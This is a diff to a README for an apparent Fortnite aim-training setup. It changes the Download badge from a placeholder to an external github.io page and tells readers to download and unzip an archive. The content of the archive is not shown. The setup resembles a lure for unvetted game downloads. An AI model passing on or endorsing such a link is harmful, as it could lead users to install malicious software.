@@ -9,7 +9,7 @@ This setup is perfect for **casual players who want smoother gameplay** as well 
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://fortnite-aim-training-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Install the recommended Windows aim trainer (Aim Lab, Kovaak’s, or similar).  
